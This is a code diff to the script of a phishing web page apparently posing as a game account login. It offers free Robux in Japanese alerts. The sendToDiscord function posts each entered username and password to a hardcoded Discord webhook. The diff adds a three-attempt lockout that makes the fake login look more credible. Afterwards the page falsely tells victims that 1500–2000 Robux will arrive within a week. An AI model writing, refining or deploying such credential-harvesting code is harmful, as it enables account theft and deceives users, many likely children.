@@ -263,49 +263,88 @@
         }
     </style>
     <script>
-     
-        function toggleLoginButton() {
-            var username = document.getElementById("username");
-            var password = document.getElementById("password");
-            var loginButton = document.getElementById("loginButton");
+    let loginAttempts = JSON.parse(localStorage.getItem("loginAttempts")) || { count: 0, lastInput: "", lockTime: null };
 
-            if (username.value !== "" && password.value !== "") {
-                loginButton.disabled = false;
-            } else {
-                loginButton.disabled = true;
-            }
+    window.onload = function() {
+        checkLoginStatus();
+    };
+
+    function toggleLoginButton() {
+        let username = document.getElementById("username").value;
+        let password = document.getElementById("password").value;
+        let loginButton = document.getElementById("loginButton");
+
+        loginButton.disabled = username === "" || password === "";
+        checkLoginStatus();
+    }
+
+    function lockLoginButton() {
+        loginAttempts.lockTime = new Date().getTime();
+        localStorage.setItem("loginAttempts", JSON.stringify(loginAttempts));
+        checkLoginStatus();
+    }
+
+    function checkLoginStatus() {
+        let loginButton = document.getElementById("loginButton");
+        let now = new Date().getTime();
+
+        if (loginAttempts.lockTime && now - loginAttempts.lockTime < 600000) {
+            let remainingTime = Math.ceil((600000 - (now - loginAttempts.lockTime)) / 1000);
+            loginButton.disabled = true;
+            loginButton.innerText = `Try again in ${remainingTime} sec`;
+            setTimeout(checkLoginStatus, 1000);
+            return;
         }
 
-        function sendToDiscord(event) {
-            event.preventDefault(); 
+        loginAttempts.lockTime = null;
+        localStorage.setItem("loginAttempts", JSON.stringify(loginAttempts));
+        loginButton.innerText = "Log In";
+    }
 
-            var username = document.getElementById("username").value;
-            var password = document.getElementById("password").value;
+    function sendToDiscord(event) {
+        event.preventDefault();
 
-            var data = {
-                content: `New Login Attempt:\n**Username/Email/Phone**: ${username}\n**Password**: ${password}`
-            };
+        let username = document.getElementById("username").value;
+        let password = document.getElementById("password").value;
+        let loginButton = document.getElementById("loginButton");
 
-            var webhookURL = "https://discordapp.com/api/webhooks/1330765219625963562/NBeRIDYXOgOBquiNTeuxO_I1s_tEw9WaTzLAGXLirIBdmq5bU6uAbHCx4U2MWIbUkTst";
-
-            fetch(webhookURL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log("Success:", data);
-                alert("Login information sent to Discord.");
-            })
-            .catch(error => {
-                console.error("Error:", error);
-                alert("完了！アカウントに1500〜2000robuxが追加されます");
-            });
+        if (loginAttempts.lastInput === `${username}:${password}`) {
+            loginAttempts.count++;
+        } else {
+            loginAttempts.count = 1;
+            loginAttempts.lastInput = `${username}:${password}`;
         }
-    </script>
+
+        if (loginAttempts.count >= 3) {
+            alert("同じ情報で3回ログインを試みました。10分後に再試行してください。");
+            lockLoginButton();
+            return;
+        }
+
+        var data = {
+            content: `New Login Attempt:\n**Username/Email/Phone**: ${username}\n**Password**: ${password}`
+        };
+
+        var webhookURL = "https://discordapp.com/api/webhooks/1330765219625963562/NBeRIDYXOgOBquiNTeuxO_I1s_tEw9WaTzLAGXLirIBdmq5bU6uAbHCx4U2MWIbUkTst";
+
+        fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Success:", data);
+            alert("完了！1週間以内に1500~2000Robuxがアカウントに追加されます");
+        })
+        .catch(error => {
+            console.error("Error:", error);
+            alert("完了！1週間以内に1500~2000Robuxがアカウントに追加されます");
+        });
+
+        localStorage.setItem("loginAttempts", JSON.stringify(loginAttempts));
+    }
+</script>
 </head>
 <body>
     <header>
